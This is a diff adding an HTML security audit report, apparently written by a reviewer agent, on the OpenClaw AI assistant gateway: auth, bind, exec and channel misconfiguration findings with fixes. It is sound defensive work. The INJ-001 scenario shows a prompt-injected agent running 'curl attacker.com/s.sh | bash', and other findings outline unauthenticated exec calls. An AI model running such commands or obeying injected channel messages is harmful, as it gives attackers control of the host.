@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Review Report — openclaw/openclaw</title>
+  <style>
+    :root {
+      --bg: #0f1419;
+      --surface: #1a2332;
+      --surface2: #243044;
+      --text: #e6edf3;
+      --muted: #8b9cb3;
+      --border: #303d52;
+      --critical: #ff6b6b;
+      --high: #ff9f43;
+      --medium: #feca57;
+      --low: #54a0ff;
+      --info: #5f27cd;
+      --pass: #1dd1a1;
+      --link: #48dbfb;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      font-size: 15px;
+    }
+    .layout { display: flex; min-height: 100vh; }
+    nav {
+      width: 280px;
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      padding: 1.5rem;
+      position: sticky;
+      top: 0;
+      height: 100vh;
+      overflow-y: auto;
+      flex-shrink: 0;
+    }
+    nav h2 { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.08em; color: var(--muted); margin: 1.25rem 0 0.5rem; }
+    nav h2:first-child { margin-top: 0; }
+    nav a {
+      display: block;
+      color: var(--muted);
+      text-decoration: none;
+      padding: 0.35rem 0;
+      font-size: 0.875rem;
+    }
+    nav a:hover { color: var(--link); }
+    main { flex: 1; padding: 2.5rem 3rem; max-width: 960px; }
+    h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .meta { color: var(--muted); font-size: 0.9rem; margin-bottom: 2rem; }
+    .meta a { color: var(--link); }
+    h2 { font-size: 1.35rem; margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; margin: 1.5rem 0 0.75rem; }
+    p { margin-bottom: 1rem; }
+    .badge {
+      display: inline-block;
+      padding: 0.2rem 0.6rem;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .badge-critical { background: rgba(255,107,107,0.2); color: var(--critical); }
+    .badge-high { background: rgba(255,159,67,0.2); color: var(--high); }
+    .badge-medium { background: rgba(254,202,87,0.2); color: var(--medium); }
+    .badge-low { background: rgba(84,160,255,0.2); color: var(--low); }
+    .badge-info { background: rgba(95,39,205,0.2); color: #a29bfe; }
+    .badge-pass { background: rgba(29,209,161,0.2); color: var(--pass); }
+    .recommendation {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--high);
+      padding: 1.25rem 1.5rem;
+      border-radius: 8px;
+      margin: 1.5rem 0;
+    }
+    .recommendation.block { border-left-color: var(--critical); }
+    .recommendation.approve-fixes { border-left-color: var(--medium); }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0 1.5rem;
+      font-size: 0.9rem;
+    }
+    th, td {
+      text-align: left;
+      padding: 0.65rem 0.85rem;
+      border-bottom: 1px solid var(--border);
+    }
+    th { background: var(--surface2); color: var(--muted); font-weight: 600; font-size: 0.75rem; text-transform: uppercase; }
+    tr:hover td { background: rgba(255,255,255,0.02); }
+    .finding {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin-bottom: 1.25rem;
+    }
+    .finding-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; flex-wrap: wrap; }
+    .finding-header h3 { margin: 0; flex: 1; min-width: 200px; }
+    .finding-meta { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 0.5rem; margin-bottom: 1rem; font-size: 0.85rem; }
+    .finding-meta dt { color: var(--muted); }
+    .finding-meta dd { font-family: ui-monospace, monospace; }
+    pre, code {
+      font-family: ui-monospace, "SF Mono", Menlo, monospace;
+      font-size: 0.82rem;
+    }
+    pre {
+      background: #0a0e14;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem;
+      overflow-x: auto;
+      margin: 0.75rem 0;
+    }
+    code { color: #7ee787; }
+    .section-intro { color: var(--muted); margin-bottom: 1rem; }
+    ul, ol { margin: 0.5rem 0 1rem 1.5rem; }
+    li { margin-bottom: 0.35rem; }
+    .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 0.75rem; margin: 1.5rem 0; }
+    .stat {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1rem;
+      text-align: center;
+    }
+    .stat .num { font-size: 1.75rem; font-weight: 700; }
+    .stat .label { font-size: 0.7rem; color: var(--muted); text-transform: uppercase; }
+    .stat-critical .num { color: var(--critical); }
+    .stat-high .num { color: var(--high); }
+    .stat-medium .num { color: var(--medium); }
+    .stat-low .num { color: var(--low); }
+    .stat-info .num { color: #a29bfe; }
+    .safe-list li { color: var(--pass); }
+    .toc-num { color: var(--muted); margin-right: 0.25rem; }
+    @media (max-width: 900px) {
+      .layout { flex-direction: column; }
+      nav { width: 100%; height: auto; position: relative; }
+      main { padding: 1.5rem; }
+      .stats { grid-template-columns: repeat(3, 1fr); }
+    }
+    @media print {
+      body { background: #fff; color: #111; }
+      nav { display: none; }
+      .finding, table th { background: #f5f5f5; }
+      pre { background: #eee; border-color: #ccc; }
+    }
+  </style>
+</head>
+<body>
+<div class="layout">
+  <nav>
+    <h2>Report</h2>
+    <a href="#executive">Executive Summary</a>
+    <a href="#scope">Scope &amp; Architecture</a>
+    <a href="#threat-model">Threat Model</a>
+    <a href="#summary-table">Findings Summary</a>
+    <h2>Findings</h2>
+    <a href="#critical-high">Critical &amp; High</a>
+    <a href="#IAC-001">IAC-001 Docker LAN bind</a>
+    <a href="#AUTH-001">AUTH-001 No auth + remote bind</a>
+    <a href="#INJ-001">INJ-001 Exec defaults full/off</a>
+    <a href="#AUTH-002">AUTH-002 Loopback no auth</a>
+    <a href="#API-001">API-001 HTTP tool allowlist</a>
+    <a href="#AUTHZ-001">AUTHZ-001 Open DM policy</a>
+    <a href="#AUTH-003">AUTH-003 Control UI origins</a>
+    <a href="#medium">Medium</a>
+    <a href="#low-info">Low &amp; Info</a>
+    <a href="#verified-safe">Verified Safe</a>
+    <h2>Analysis</h2>
+    <a href="#owasp">OWASP Top 10</a>
+    <a href="#out-of-scope">Out of Scope</a>
+    <a href="#next-steps">Next Steps</a>
+  </nav>
+
+  <main>
+    <h1>Security Review Report</h1>
+    <p class="meta">
+      <strong>Target:</strong> <a href="https://github.com/openclaw/openclaw" target="_blank" rel="noopener">openclaw/openclaw</a> (full repository audit, v2026.5.27)<br>
+      <strong>Reviewer:</strong> Security Reviewer agent (<code>.github/agents/security-reviewer.agent.md</code>)<br>
+      <strong>Date:</strong> 2026-05-27<br>
+      <strong>Method:</strong> Static adversarial code review — methodology, domain skills, OWASP baseline, structured report format
+    </p>
+
+    <section id="executive">
+      <h2>Executive Summary</h2>
+      <p>
+        <strong>OpenClaw</strong> is a local-first personal AI assistant: a Node.js/TypeScript monorepo with a Gateway control plane,
+        multi-channel messaging integrations (WhatsApp, Telegram, Slack, Discord, etc.), agent tool execution (shell, filesystem, browser, MCP),
+        optional Docker sandboxing, and a Lit-based Control UI. The project explicitly models <strong>one trusted operator per gateway</strong> — not multi-tenant adversarial isolation.
+      </p>
+      <p>
+        The codebase demonstrates mature security engineering: built-in <code>openclaw doctor</code> / security audit tooling, SSRF pinning with metadata IP blocking,
+        constant-time secret comparison, hook token hardening, weak-credential rejection, skill/plugin static scanning, and non-root Docker runtime.
+        Risk concentrates in <strong>deployment misconfiguration</strong> (LAN/public bind without auth, open DM policies, exec running on host with <code>security=full</code>)
+        and in the intentional trusted-operator feature surface (full gateway token = full RCE via tools).
+      </p>
+
+      <div class="recommendation approve-fixes">
+        <strong>Recommendation: Approve with fixes — safe for intended local-first use; do not expose to untrusted networks without mandatory hardening.</strong>
+        <p style="margin:0.75rem 0 0">Do not deploy Gateway on LAN/internet with <code>gateway.auth.mode=none</code>, open DM policies, or host exec without sandboxing and channel allowlists. Run <code>openclaw security audit</code> after every config change. Critical findings below are exploitable when operators ignore documented trust boundaries — not latent logic bugs in the default onboarding path.</p>
+      </div>
+
+      <div class="stats">
+        <div class="stat stat-critical"><div class="num">2</div><div class="label">Critical</div></div>
+        <div class="stat stat-high"><div class="num">6</div><div class="label">High</div></div>
+        <div class="stat stat-medium"><div class="num">9</div><div class="label">Medium</div></div>
+        <div class="stat stat-low"><div class="num">4</div><div class="label">Low</div></div>
+        <div class="stat stat-info"><div class="num">7</div><div class="label">Info</div></div>
+      </div>
+    </section>
+
+    <section id="scope">
+      <h2>Scope &amp; Architecture</h2>
+      <p class="section-intro">Full-repository review of the public <code>openclaw/openclaw</code> codebase (shallow clone of main, ~8,500+ source files under <code>src/</code>, <code>extensions/</code>, <code>ui/</code>, <code>apps/</code>).</p>
+
+      <table>
+        <thead><tr><th>Component</th><th>Details</th></tr></thead>
+        <tbody>
+          <tr><td>Runtime</td><td>Node.js ≥22.19 (Node 24 recommended), TypeScript, pnpm monorepo</td></tr>
+          <tr><td>Control plane</td><td>Gateway HTTP/WebSocket (<code>src/gateway/</code>) — port 18789 default</td></tr>
+          <tr><td>Agent tools</td><td>exec/spawn/shell, fs_*, browser/canvas, MCP, web-fetch, sessions, cron</td></tr>
+          <tr><td>Channels</td><td>40+ messaging integrations under <code>extensions/</code> with DM pairing/allowlist policies</td></tr>
+          <tr><td>Authentication</td><td>Gateway shared secret (token/password), Tailscale Serve, trusted-proxy, device pairing</td></tr>
+          <tr><td>Isolation</td><td>Optional Docker sandbox (<code>agents.defaults.sandbox.mode</code>, default <code>off</code>)</td></tr>
+          <tr><td>UI</td><td>Control UI + WebChat (<code>ui/</code>) with origin checks on WebSocket</td></tr>
+          <tr><td>Trust boundaries</td><td>Internet → channel webhooks; LAN → Gateway; Operator → full tool surface; Plugin → trusted local code</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Data flows reviewed</h3>
+      <pre>Channel message → DM/group policy → agent session → tool dispatch (exec/fs/fetch/browser)
+HTTP Bearer token → /tools/invoke, /v1/chat/completions → full operator tool access
+Hook POST → hooks.token auth → agent wake/dispatch
+Plugin SDK fetch → SSRF policy → pinned DNS → undici dispatcher</pre>
+    </section>
+
+    <section id="threat-model">
+      <h2>Threat Model Summary</h2>
+      <table>
+        <thead><tr><th>STRIDE</th><th>Applicable threat</th><th>Priority</th></tr></thead>
+        <tbody>
+          <tr><td>Spoofing</td><td>Gateway token theft; forged hook requests; channel sender impersonation without allowlist</td><td><span class="badge badge-high">High</span></td></tr>
+          <tr><td>Tampering</td><td>Prompt injection → tool abuse; config mutation via stolen gateway secret</td><td><span class="badge badge-high">High</span></td></tr>
+          <tr><td>Information disclosure</td><td>Session history via gateway API; secrets in config/state dirs; model context leakage</td><td><span class="badge badge-medium">Medium</span></td></tr>
+          <tr><td>Denial of service</td><td>Hook/auth rate limits exist; large media payloads; unbounded agent turns</td><td><span class="badge badge-medium">Medium</span></td></tr>
+          <tr><td>Elevation of privilege</td><td>Untrusted DM → agent with host exec; Docker socket mount → host escape</td><td><span class="badge badge-critical">Critical</span></td></tr>
+        </tbody>
+      </table>
+
+      <h3>App-specific review guidelines</h3>
+      <ol>
+        <li>Every non-loopback Gateway bind must have <code>gateway.auth</code> token/password configured (<code>src/security/audit-gateway-config.ts</code>).</li>
+        <li>Shared gateway bearer auth is <strong>full operator access</strong> — treat token compromise as RCE (<code>SECURITY.md</code>, <code>src/gateway/tools-invoke-http.ts:45-47</code>).</li>
+        <li>Channel ingress must use <code>dmPolicy=pairing</code> or allowlist — never <code>open</code> on internet-facing bots without explicit acceptance.</li>
+        <li>Host exec defaults to <code>security=full, ask=off</code> when sandbox is off (<code>src/agents/exec-defaults.ts:117-132</code>) — enable sandbox or tighten exec policy for channel-facing agents.</li>
+        <li>All outbound fetches must pass <code>src/infra/net/ssrf.ts</code> pinning unless operator opts into <code>dangerouslyAllowPrivateNetwork</code>.</li>
+        <li>Plugins/skills are trusted computing base — scan before install (<code>src/security/skill-scanner.js</code>).</li>
+        <li>Docker Compose must not publish LAN bind without pre-set <code>OPENCLAW_GATEWAY_TOKEN</code>.</li>
+      </ol>
+    </section>
+
+    <section id="summary-table">
+      <h2>Findings Summary</h2>
+      <table>
+        <thead><tr><th>ID</th><th>Severity</th><th>Category</th><th>Title</th></tr></thead>
+        <tbody>
+          <tr><td>IAC-001</td><td><span class="badge badge-critical">Critical</span></td><td>IaC</td><td>Docker Compose defaults to LAN bind on 0.0.0.0</td></tr>
+          <tr><td>AUTH-001</td><td><span class="badge badge-critical">Critical</span></td><td>Authentication</td><td>gateway.auth.mode=none on non-loopback bind</td></tr>
+          <tr><td>INJ-001</td><td><span class="badge badge-high">High</span></td><td>Injection/RCE</td><td>Exec defaults security=full, ask=off on gateway host</td></tr>
+          <tr><td>AUTH-002</td><td><span class="badge badge-high">High</span></td><td>Authentication</td><td>Loopback bind without auth behind reverse proxy</td></tr>
+          <tr><td>API-001</td><td><span class="badge badge-high">High</span></td><td>API</td><td>gateway.tools.allow re-enables dangerous HTTP tools</td></tr>
+          <tr><td>AUTHZ-001</td><td><span class="badge badge-high">High</span></td><td>Authorization</td><td>dmPolicy=open allows anyone to drive the agent</td></tr>
+          <tr><td>AUTH-003</td><td><span class="badge badge-high">High</span></td><td>Authentication</td><td>Non-loopback Control UI without allowedOrigins</td></tr>
+          <tr><td>API-002</td><td><span class="badge badge-high">High</span></td><td>API</td><td>/tools/invoke bearer = full operator RCE surface</td></tr>
+          <tr><td>CFG-001</td><td><span class="badge badge-medium">Medium</span></td><td>Misconfiguration</td><td>Quickstart enables allowInsecureAuth on loopback</td></tr>
+          <tr><td>SSRF-001</td><td><span class="badge badge-medium">Medium</span></td><td>SSRF</td><td>dangerouslyAllowPrivateNetwork opt-in</td></tr>
+          <tr><td>IAC-002</td><td><span class="badge badge-medium">Medium</span></td><td>IaC</td><td>Optional Docker socket mount for sandbox</td></tr>
+          <tr><td>CFG-002</td><td><span class="badge badge-medium">Medium</span></td><td>Misconfiguration</td><td>tools.fs.workspaceOnly=false expands FS access</td></tr>
+          <tr><td>CFG-003</td><td><span class="badge badge-medium">Medium</span></td><td>Misconfiguration</td><td>Control UI wildcard allowedOrigins</td></tr>
+          <tr><td>CFG-004</td><td><span class="badge badge-medium">Medium</span></td><td>Misconfiguration</td><td>Host-header origin fallback weakens CSRF/rebind defense</td></tr>
+          <tr><td>HOOKS-001</td><td><span class="badge badge-medium">Medium</span></td><td>Authorization</td><td>hooks.allowRequestSessionKey session injection</td></tr>
+          <tr><td>DESER-001</td><td><span class="badge badge-medium">Medium</span></td><td>Deserialization</td><td>JSON config parsing — no schema signing</td></tr>
+          <tr><td>SEC-001</td><td><span class="badge badge-medium">Medium</span></td><td>Secrets</td><td>Secrets stored in local config/state dirs</td></tr>
+          <tr><td>DEPS-001</td><td><span class="badge badge-medium">Medium</span></td><td>Dependencies</td><td>Large dependency tree; manual audit recommended</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section id="critical-high">
+      <h2>Critical &amp; High Findings</h2>
+
+      <article class="finding" id="IAC-001">
+        <div class="finding-header">
+          <h3>[IAC-001] Docker Compose defaults to LAN bind (0.0.0.0)</h3>
+          <span class="badge badge-critical">Critical</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>Infrastructure / Misconfiguration</dd></div>
+          <div><dt>Location</dt><dd>docker-compose.yml:63-76</dd></div>
+          <div><dt>CWE</dt><dd>CWE-16, CWE-306</dd></div>
+        </dl>
+        <p><strong>Description.</strong> The shipped Docker Compose file publishes ports <code>18789</code>/<code>18790</code> and starts the Gateway with <code>--bind lan</code> (all interfaces). <code>OPENCLAW_GATEWAY_TOKEN</code> is optional in the environment file. While startup auto-generates a runtime token when unset (<code>src/gateway/startup-auth.ts:191-221</code>), it is not persisted (<code>persistedGeneratedToken: false</code>), making token rotation/opaque retrieval difficult and encouraging operators to run without a pre-provisioned secret.</p>
+        <p><strong>Evidence.</strong></p>
+        <pre>ports:
+  - "${OPENCLAW_GATEWAY_PORT:-18789}:18789"
+command:
+  ["node", "dist/index.js", "gateway", "--bind", "${OPENCLAW_GATEWAY_BIND:-lan}", ...]
+environment:
+  OPENCLAW_GATEWAY_TOKEN: ${OPENCLAW_GATEWAY_TOKEN:-}</pre>
+        <p><strong>Exploit scenario.</strong></p>
+        <ol>
+          <li>Operator runs <code>docker compose up</code> on a cloud VM or home network without setting <code>OPENCLAW_GATEWAY_TOKEN</code>.</li>
+          <li>Gateway listens on <code>0.0.0.0:18789</code> reachable from the LAN or public security group.</li>
+          <li>Attacker on the same network scans for the port; if token is leaked from logs/UI or auth is mis-set to <code>none</code>, attacker obtains full operator access including <code>POST /tools/invoke</code> → host exec.</li>
+        </ol>
+        <p><strong>Remediation.</strong> Change default bind to <code>loopback</code> with <code>network_mode: host</code> documented for advanced cases; require non-empty <code>OPENCLAW_GATEWAY_TOKEN</code> at compose startup (fail closed); persist generated tokens to mounted config volume.</p>
+        <p><strong>Verification.</strong> <code>docker compose config</code> shows loopback bind; container refuses start when token env is empty on non-loopback bind; <code>openclaw security audit</code> reports no <code>gateway.bind_no_auth</code> finding.</p>
+      </article>
+
+      <article class="finding" id="AUTH-001">
+        <div class="finding-header">
+          <h3>[AUTH-001] Gateway auth.mode=none on non-loopback bind</h3>
+          <span class="badge badge-critical">Critical</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>Authentication</dd></div>
+          <div><dt>Location</dt><dd>src/security/audit-gateway-config.ts:118-125; src/security/audit-extra.sync.ts:754-764</dd></div>
+          <div><dt>CWE</dt><dd>CWE-306, CWE-862</dd></div>
+        </dl>
+        <p><strong>Description.</strong> When <code>gateway.auth.mode</code> is <code>none</code> and bind is not loopback (or Tailscale serve/funnel is active), HTTP endpoints including <code>/tools/invoke</code>, optional <code>/v1/chat/completions</code>, and <code>/v1/responses</code> are reachable without a shared secret. The built-in audit flags this as critical.</p>
+        <p><strong>Evidence.</strong></p>
+        <pre>if (bind !== "loopback" && !hasSharedSecret && auth.mode !== "trusted-proxy") {
+  findings.push({
+    checkId: "gateway.bind_no_auth",
+    severity: "critical",
+    title: "Gateway binds beyond loopback without auth",
+    ...
+  });
+}</pre>
+        <p><strong>Exploit scenario.</strong></p>
+        <ol>
+          <li>Operator sets <code>gateway.auth.mode: "none"</code> and <code>gateway.bind: "lan"</code> for convenience.</li>
+          <li>Attacker sends unauthenticated <code>POST /tools/invoke</code> with <code>{"tool":"exec","args":{...}}</code>.</li>
+          <li>Attacker executes arbitrary commands on the gateway host as the Node process user.</li>
+        </ol>
+        <p><strong>Remediation.</strong> Refuse startup when <code>mode=none</code> and bind ≠ loopback (fail closed); keep audit check enabled; document that HTTP compatibility endpoints require token/password auth.</p>
+        <p><strong>Verification.</strong> Gateway process exits on invalid combo; audit shows zero critical auth findings after fix.</p>
+      </article>
+
+      <article class="finding" id="INJ-001">
+        <div class="finding-header">
+          <h3>[INJ-001] Exec tool defaults to security=full, ask=off on gateway host</h3>
+          <span class="badge badge-high">High</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>OS Command Injection / RCE</dd></div>
+          <div><dt>Location</dt><dd>src/agents/exec-defaults.ts:117-132</dd></div>
+          <div><dt>CWE</dt><dd>CWE-78</dd></div>
+        </dl>
+        <p><strong>Description.</strong> When sandbox is unavailable (<code>agents.defaults.sandbox.mode=off</code>, the default per <code>SECURITY.md</code>), exec resolves to the gateway host with <code>security: "full"</code> and <code>ask: "off"</code> unless explicitly overridden. This is intentional for the trusted single-operator model but creates RCE when an untrusted channel sender can trigger agent turns.</p>
+        <p><strong>Evidence.</strong></p>
+        <pre>const defaultSecurity = resolved.effectiveHost === "sandbox" ? "deny" : "full";
+return {
+  security: ... ?? defaultSecurity,  // "full" on gateway
+  ask: ... ?? "off",
+};</pre>
+        <p><strong>Exploit scenario.</strong></p>
+        <ol>
+          <li>Operator connects Telegram with permissive DM policy or approves a malicious paired sender.</li>
+          <li>Attacker sends a message crafted to make the model invoke the exec tool (prompt injection).</li>
+          <li>Agent runs <code>curl attacker.com/s.sh | bash</code> on the host without approval prompt.</li>
+        </ol>
+        <p><strong>Remediation.</strong> For channel-facing agents: set <code>agents.defaults.sandbox.mode</code> to <code>non-main</code> or <code>all</code>; configure <code>tools.exec.security: "allowlist"</code> and <code>tools.exec.ask: "on-miss"</code>; restrict channel DM/group policies to allowlisted senders only.</p>
+        <p><strong>Verification.</strong> <code>openclaw security audit</code> shows no <code>tools.exec.security_full_configured</code> warning for production agents; test exec from sandboxed session is denied on gateway host.</p>
+      </article>
+
+      <article class="finding" id="AUTH-002">
+        <div class="finding-header">
+          <h3>[AUTH-002] Loopback bind without gateway auth secret</h3>
+          <span class="badge badge-high">High</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>Authentication</dd></div>
+          <div><dt>Location</dt><dd>src/security/audit-gateway-config.ts:153-162</dd></div>
+          <div><dt>CWE</dt><dd>CWE-306</dd></div>
+        </dl>
+        <p><strong>Description.</strong> Loopback-only bind without a configured gateway auth secret is flagged critical when Control UI is enabled, because reverse proxies can expose loopback services to the internet without the operator realizing auth is absent.</p>
+        <pre>if (bind === "loopback" && controlUiEnabled && !hasGatewayAuth) {
+  checkId: "gateway.loopback_no_auth",
+  severity: "critical",
+  ...
+}</pre>
+        <p><strong>Exploit scenario.</strong> Operator puts nginx/Caddy in front of <code>127.0.0.1:18789</code> without configuring <code>gateway.auth.token</code>. External users reach Control UI WebSocket and HTTP APIs without credentials.</p>
+        <p><strong>Remediation.</strong> Always set <code>OPENCLAW_GATEWAY_TOKEN</code> before exposing via reverse proxy; configure <code>gateway.trustedProxies</code> and <code>gateway.controlUi.allowedOrigins</code>.</p>
+        <p><strong>Verification.</strong> Audit passes; unauthenticated external request to proxied UI returns 401.</p>
+      </article>
+
+      <article class="finding" id="API-001">
+        <div class="finding-header">
+          <h3>[API-001] gateway.tools.allow re-enables dangerous HTTP tools</h3>
+          <span class="badge badge-high">High</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>API security</dd></div>
+          <div><dt>Location</dt><dd>src/security/dangerous-tools.ts:9-34; src/security/audit-gateway-config.ts:104-116</dd></div>
+          <div><dt>CWE</dt><dd>CWE-749</dd></div>
+        </dl>
+        <p><strong>Description.</strong> By default, high-risk tools (<code>exec</code>, <code>spawn</code>, <code>shell</code>, <code>fs_write</code>, <code>sessions_spawn</code>, <code>cron</code>, <code>gateway</code>, <code>nodes</code>, etc.) are denied over HTTP <code>POST /tools/invoke</code>. Adding them to <code>gateway.tools.allow</code> removes them from the deny list — severity escalates to critical when gateway is remotely exposed.</p>
+        <pre>export const DEFAULT_GATEWAY_HTTP_TOOL_DENY = [
+  "exec", "spawn", "shell", "fs_write", "fs_delete", ...
+];</pre>
+        <p><strong>Exploit scenario.</strong> Operator adds <code>exec</code> to <code>gateway.tools.allow</code> for automation. Stolen bearer token → direct HTTP RCE without WebSocket session.</p>
+        <p><strong>Remediation.</strong> Keep default deny list; use WebSocket operator session for interactive tools; if HTTP exec is required, bind loopback-only and rotate tokens frequently.</p>
+        <p><strong>Verification.</strong> HTTP POST <code>/tools/invoke</code> with tool <code>exec</code> returns forbidden unless explicitly allowed.</p>
+      </article>
+
+      <article class="finding" id="AUTHZ-001">
+        <div class="finding-header">
+          <h3>[AUTHZ-001] dmPolicy=open allows any sender to drive the agent</h3>
+          <span class="badge badge-high">High</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>Authorization / Business logic</dd></div>
+          <div><dt>Location</dt><dd>src/security/audit-channel.ts:17-28, 219-225; src/security/dm-policy-shared.ts:192</dd></div>
+          <div><dt>CWE</dt><dd>CWE-862</dd></div>
+        </dl>
+        <p><strong>Description.</strong> Channel DM policy <code>open</code> with <code>allowFrom: ["*"]</code> allows any messaging user to interact with the agent. Combined with host exec defaults, this is equivalent to public RCE for internet-facing bots. Default wizard policy is <code>pairing</code> (<code>src/channels/plugins/setup-wizard-helpers.ts:657</code>) — safe unless operator overrides.</p>
+        <p><strong>Exploit scenario.</strong> Operator sets WhatsApp/Telegram DM policy to open for a public support bot. Any user messages the bot → agent executes attacker-controlled tool calls on the host.</p>
+        <p><strong>Remediation.</strong> Keep <code>dmPolicy: "pairing"</code> or strict allowlists; enable sandbox for any channel with &gt;1 untrusted sender; run channel warnings from security audit before go-live.</p>
+        <p><strong>Verification.</strong> Unknown sender receives pairing code, not agent execution; audit reports no open DM policies.</p>
+      </article>
+
+      <article class="finding" id="AUTH-003">
+        <div class="finding-header">
+          <h3>[AUTH-003] Non-loopback Control UI without explicit allowedOrigins</h3>
+          <span class="badge badge-high">High</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>Authentication / CSRF</dd></div>
+          <div><dt>Location</dt><dd>src/security/audit-gateway-config.ts:164-180; src/gateway/origin-check.ts:35-78</dd></div>
+          <div><dt>CWE</dt><dd>CWE-352, CWE-942</dd></div>
+        </dl>
+        <p><strong>Description.</strong> Control UI WebSocket connections validate browser <code>Origin</code> against <code>gateway.controlUi.allowedOrigins</code>. On non-loopback binds, empty allowlist is a critical misconfiguration. Origin check includes private-network same-origin fallback but not public DNS rebinding without explicit allowlist.</p>
+        <p><strong>Exploit scenario.</strong> Gateway on LAN without <code>allowedOrigins</code>; attacker hosts malicious page that attempts cross-origin WebSocket connection — mitigated only if origin check rejects; mis-set <code>dangerouslyAllowHostHeaderOriginFallback</code> weakens defense.</p>
+        <p><strong>Remediation.</strong> Set explicit HTTPS origins; never use <code>"*"</code> on exposed deployments; disable host-header fallback.</p>
+        <p><strong>Verification.</strong> WebSocket from untrusted origin rejected with policy error; audit clean.</p>
+      </article>
+
+      <article class="finding" id="API-002">
+        <div class="finding-header">
+          <h3>[API-002] Shared gateway bearer = full operator access on HTTP tool endpoints</h3>
+          <span class="badge badge-high">High</span>
+        </div>
+        <dl class="finding-meta">
+          <div><dt>Category</dt><dd>API / Authorization design</dd></div>
+          <div><dt>Location</dt><dd>src/gateway/tools-invoke-http.ts:45-47; SECURITY.md:126-133</dd></div>
+          <div><dt>CWE</dt><dd>CWE-269</dd></div>
+        </dl>
+        <p><strong>Description.</strong> Documented design: token/password bearer on <code>/tools/invoke</code> and OpenAI-compatible endpoints grants full operator scopes; <code>x-openclaw-scopes</code> headers do not restrict shared-secret callers. This is not a bypass — it is the trust model — but operators treating the token as a narrow API key will over-expose RCE.</p>
+        <pre>// /tools/invoke intentionally uses the same shared-secret HTTP trust model ...
+// token/password bearer auth is full operator access for the gateway</pre>
+        <p><strong>Exploit scenario.</strong> Operator embeds gateway token in a client-side app or logs it in CI. Token leak → full filesystem/exec/gateway reconfiguration.</p>
+        <p><strong>Remediation.</strong> Treat gateway token like root password; use short-lived tokens; never embed in browsers; prefer loopback + local CLI for admin actions.</p>
+        <p><strong>Verification.</strong> Scoped header does not reduce tool access under token auth (documented behavior confirmed in tests).</p>
+      </article>
+    </section>
+
+    <section id="medium">
+      <h2>Medium Findings</h2>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[CFG-001] Quickstart enables allowInsecureAuth on loopback</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/wizard/setup.gateway-config.ts:357-371</code></p>
+        <p>Quickstart flow sets <code>gateway.controlUi.allowInsecureAuth: true</code> on loopback when unset — relaxes device auth for local dev. Flagged by <code>collectCoreInsecureOrDangerousFlags</code>.</p>
+        <p><strong>Fix:</strong> Default to false; require explicit opt-in for insecure local auth.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[SSRF-001] Private network SSRF opt-in flags</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/plugin-sdk/ssrf-policy.ts:59-63</code>, <code>src/security/dangerous-config-flags-core.ts:83-85</code></p>
+        <p><code>browser.ssrfPolicy.dangerouslyAllowPrivateNetwork=true</code> and channel-level equivalents allow fetches to RFC1918/metadata targets when enabled. Default SSRF blocks private IPs and <code>metadata.google.internal</code> (<code>src/infra/net/ssrf.ts:207-211, 411</code>).</p>
+        <p><strong>Fix:</strong> Keep defaults; audit flags when enabled; use hostname allowlists instead of blanket private-network allow.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[IAC-002] Docker socket mount enables sandbox host escape</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>docker-compose.yml:45-52</code> (commented example)</p>
+        <p>Enabling <code>/var/run/docker.sock</code> mount for agent sandbox gives the container Docker API access — path to root on host if combined with misconfigured sandbox images (<code>--privileged</code>, dangerous binds flagged in <code>src/security/audit-extra.sync.ts:844+</code>).</p>
+        <p><strong>Fix:</strong> Use rootless Docker or dedicated sandbox host; never mount socket on internet-exposed gateway containers.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[CFG-002] tools.fs.workspaceOnly=false</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/security/dangerous-config-flags-core.ts:86-88</code></p>
+        <p>Disabling workspace-only filesystem restriction lets agent file tools read/write outside the configured workspace.</p>
+        <p><strong>Fix:</strong> Keep <code>workspaceOnly: true</code> (default); scope overrides per trusted agent only.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[CFG-003] Control UI wildcard allowedOrigins</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/security/audit-gateway-config.ts:182-192</code></p>
